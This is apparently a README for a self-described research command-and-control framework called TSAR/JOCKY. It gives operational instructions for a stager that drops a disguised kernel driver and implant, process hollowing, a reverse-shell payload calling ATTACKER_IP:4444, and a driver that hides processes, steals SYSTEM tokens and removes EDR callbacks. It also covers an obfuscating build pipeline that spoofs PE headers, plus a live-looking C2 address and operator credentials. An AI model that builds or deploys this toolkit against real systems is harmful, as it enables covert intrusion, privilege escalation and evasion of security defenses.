# TSAR / JOCKY Framework — Reference

## Overview

TSAR is a research C2 (command-and-control) framework with a polymorphic compiler pipeline. It has five layers:

```
[Operator] → jocky CLI → [Build Server] → bundle.bin
                       → [C2 Server]    → agent poll/task/telemetry
                                        ↓
                                  [Stager on target]
                                        ↓
                              JockyDrv (kernel driver)
                                        ↓
                              jocky_agent.exe (process-hollowed)
```

---

## Components

### 1. C2 Server — `endpoint-management-server/`

Go / Gin REST API backed by PostgreSQL + Redis, deployed on EC2 behind nginx TLS.

Key models:
- **Agent** — registered endpoint (UUID, hostname, IP, auth token, status)
- **Task** — command queued for an agent (`shell`, `hollow`, `payload`, `burn`, …)
- **Telemetry** — logs / output returned by the agent (linked to task via `task_id`)
- **Operator** — human user; JWT-authenticated

Endpoints used by the agent:
```
POST /api/v1/agents/register
GET  /api/v1/agents/poll
POST /api/v1/agents/telemetry
GET  /api/v1/agents/bundle
```

Endpoints used by operators (via jocky CLI):
```
POST /api/v1/operator/login
GET  /api/v1/operator/agents
POST /api/v1/operator/agents/:id/tasks
GET  /api/v1/operator/agents/:id/telemetry
POST /api/v1/operator/bundle/upload
POST /api/v1/operator/payload/upload
```

Start locally (dev):
```powershell
cd endpoint-management-server
docker-compose up
```

---

### 2. Jocky Build Server — `jocky-framework/server/`

FastAPI server that accepts a `.cpp` source file and compiles it through the OLLVM pipeline, returning a hardened PE.

Start:
```powershell
cd jocky-framework
$env:JOCKY_TOKENS = "demotoken:operator"
uvicorn server.app.main:app --host 0.0.0.0 --port 8001
```

Auth: Bearer token via `JOCKY_TOKENS=token:name` env var.

Pipeline stages:
1. **Poly engine** (`polymorphic/poly_engine.py`) — renames variables, inserts junk blocks
2. **OLLVM compile** (`clang.exe` with custom passes) — obfuscates control flow
3. **Link** (clang → MSVC `link.exe`) — produces raw PE
4. **PE Header Spoof** (`tools/pe_header_spoofer.py`) — fakes timestamp, grafts MSVC Rich Header

Available passes (`-passes=`):

| Pass | Effect |
|------|--------|
| `fla` | Control-flow flattening |
| `sub` | Instruction substitution |
| `bcf` | Bogus control flow |
| `gvenc` | Global variable encryption |
| `mba` | Mixed boolean-arithmetic |
| `indcall` | Indirect calls |
| `indbr` | Indirect branches |

---

### 3. jocky CLI — `jocky-framework/client/`

Python `cmd`-based interactive shell. Wraps both the build server and C2 APIs.

Start:
```powershell
cd jocky-framework/client
python -m jocky_client
```

#### Connection commands

```
connect   --addr <ip:port> --token <token>
          Connect to jocky build server

c2connect --addr <ip:port> --user <username> --pass <password>
          Connect to C2 server (returns JWT, auto-saved)
```

Sessions are persisted across restarts.

#### Build server commands

```
build   --src <file.cpp> --out <name.exe> [--passes fla,sub] [--no-poly] [--no-spoof]
        Compile a source file through the OLLVM pipeline
        
sessions
        List saved build server sessions

history
        Show recent build jobs
```

#### C2 / agent commands

```
targets
        List registered agents (id, hostname, IP, status, last seen)

task    --agent <id> --type <type> [--cmd <cmd>]
        Queue a task for an agent
        Types: shell, hollow, payload, burn

tasks   --agent <id>
        List pending/completed tasks for an agent

telemetry --agent <id> [--limit N]
          Show telemetry/output returned by agent

shell   --agent <id>
        Interactive cmd.exe relay (REPL, latency ≈ poll interval ~30s)
        Type 'exit' or Ctrl-C to return to jocky
```

#### Bundle / deployment commands

```
bundle  upload --file <bundle.bin>
        Upload AES-encrypted JCKY bundle to C2

payload upload --file <payload.exe>
        Upload payload.exe to C2 (served as chunked DNS TXT or HTTP)

deploy  --template <file.cpp> --passes <p,q> --driver <driver.sys>
        [--agent-bin <jocky_agent.exe>] --aes-key <64hex>
        Full pipeline: build → bundle → upload to C2

burn    --agent <id>
        Send burn task: agent deletes itself and stops checking in
```

---

### 4. Stager — `stager/stager.cpp`

Deployed to the target machine. Run **as Administrator**.

What it does:
1. Fetches `bundle.bin` from C2 (`GET /api/v1/agents/bundle`)
2. Base64-decodes → AES-256-CBC-decrypts (IV prepended) → parses JCKY format
3. Drops `driver.sys` to `C:\Windows\System32\wuaueng.sys`, loads it via SCM as `JockyDrv`
4. Drops `jocky_agent.exe` to `%TEMP%\svchost_update.exe`, launches it, then deletes it
5. Agent immediately registers with C2 and begins polling for tasks

Debug log: `C:\stager_debug.log` (always written).

Common errors:

| Code | Meaning | Fix |
|------|---------|-----|
| 577 | `ERROR_INVALID_IMAGE_HASH` — unsigned driver | Re-sign: `signtool sign /fd sha256 /s My /n "JockyDriver" byovd\driver\driver.sys` |
| 32 | `ERROR_SHARING_VIOLATION` — JockyDrv already running | `sc.exe stop JockyDrv && sc.exe delete JockyDrv` on VM |

---

### 5. Kernel Driver — `byovd/driver/driver.c`

Loaded by stager as `JockyDrv`. Kernel-mode capabilities:
- `JockyHideProcess` — unlinks process from `PsActiveProcessLinks` (hides from tasklist)
- `JockyStealToken` — duplicates SYSTEM token into target process
- `JockyRemoveCallbacks` — strips EDR notify callbacks from kernel

Must be test-signed. After every `build.bat` run:
```powershell
signtool sign /fd sha256 /s My /n "JockyDriver" byovd\driver\driver.sys
```
`signtool verify /pa` will say "root not trusted" — that is expected for self-signed certs, ignore it.

---

### 6. Agent — `directSyscall/agent.cpp`

The C2 implant. Compiled into `jocky_agent.exe`.

- Registers with C2 on first run, saves `agent_id` + `auth_token`
- Polls `GET /api/v1/agents/poll` every 30 seconds
- Dispatches tasks and posts results back via telemetry

Task types handled:

| Type | Action |
|------|--------|
| `shell` | `cmd.exe /C <cmd>`, posts stdout to telemetry |
| `hollow` | Process-hollows `payload.exe` into `RuntimeBroker.exe` (or `dllhost.exe`) |
| `payload` | Downloads and launches `payload.exe` from C2 |
| `burn` | Deletes self, stops polling |

Syscall resolution: Hell's Gate → Halo's Gate → fresh ntdll copy fallback.

---

### 7. Process Hollow — `processhollowing/hollow.cpp`

Injects `payload.exe` into a target process using direct syscalls.

Syscalls used: `NtCreateProcess`, `NtWriteVirtualMemory`, `NtCreateThreadEx` via `syscall_stub.asm`.

---

### 8. Payload — `processhollowing/payload.cpp`

Reverse shell that connects back to `ATTACKER_IP:4444`. Entry point: `payload_entry` (not `main`), compiled with `/SUBSYSTEM:WINDOWS /NODEFAULTLIB`.

Auto-copied to `C:\Users\Public\payload.exe` by `build.bat`.

---

## Build System — `build.bat`

Run from the repo root in a Developer Command Prompt (or it bootstraps MSVC itself).

```
build.bat
```

Build order:
1. `payload.exe`
2. `syscall_stub.obj`
3. `driver.sys` + auto-sign
4. `client.exe` (standalone BYOVD tester)
5. `jocky_agent.exe`
6. `stager.exe`
7. `bundle.bin` (via `build_bundle.py`)

Reads config from `endpoint-management-server/.env`:
```
JOCKY_C2_HOST=65.1.92.74
JOCKY_ATTACKER_IP=65.1.92.74
JOCKY_AES_KEY=<64 hex chars>
```

---

## Bundle Format — `JCKY`

```
base64(
  AES-256-CBC(
    IV[16] ||
    BundleHeader[16]   magic="JCKY" version=0x01 num_files=2
    BundleEntry[13]    type=0x01 size=N offset=O   ← driver.sys
    BundleEntry[13]    type=0x04 size=N offset=O   ← jocky_agent.exe
    <raw file data>
  )
)
```

Build manually:
```powershell
python build_bundle.py
# or
python build_bundle.py byovd/driver/driver.sys directSyscall/jocky_agent.exe bundle.bin
```

---

## Typical Workflow

```
# 1. Build everything
build.bat

# 2. Start build server
cd jocky-framework
$env:JOCKY_TOKENS = "demotoken:operator"
uvicorn server.app.main:app --port 8001

# 3. Open jocky CLI
cd jocky-framework/client
python -m jocky_client

jocky > connect --addr localhost:8001 --token demotoken
jocky > c2connect --addr 65.1.92.74:443 --user admin --pass JockyAdmin2024!!

# 4. Deploy new obfuscated agent + bundle to C2
jocky > deploy --template C:\...\templates\agent_template.cpp \
               --passes fla,sub \
               --driver C:\...\byovd\driver\driver.sys \
               --agent-bin C:\...\directSyscall\jocky_agent.exe \
               --aes-key 6a6f636b795f6465765f6165735f6b65795f6a6f636b795f6465765f6165736b

# 5. Copy stager to VM, run as admin
#    stager fetches bundle, loads driver, launches agent

# 6. Agent checks in — interact with it
jocky > targets
jocky > shell --agent <agent_id>
[abc123]> whoami
[abc123]> exit

jocky > task --agent <id> --type hollow
jocky > telemetry --agent <id>

# 7. Cleanup
jocky > burn --agent <id>
```

---

## Persistence Notes

- **JockyDrv** survives reboots if the service entry is not cleaned up. To remove from VM:
  ```
  sc.exe stop JockyDrv
  sc.exe delete JockyDrv
  del C:\Windows\System32\wuaueng.sys
  ```
- Defender exclusions needed on test VM: `C:\Users\joe\AppData\Local\Temp`, `C:\Users\Public`, process `svchost_update.exe`.
- Test-signing must be enabled on the VM: `bcdedit /set testsigning on` + reboot.
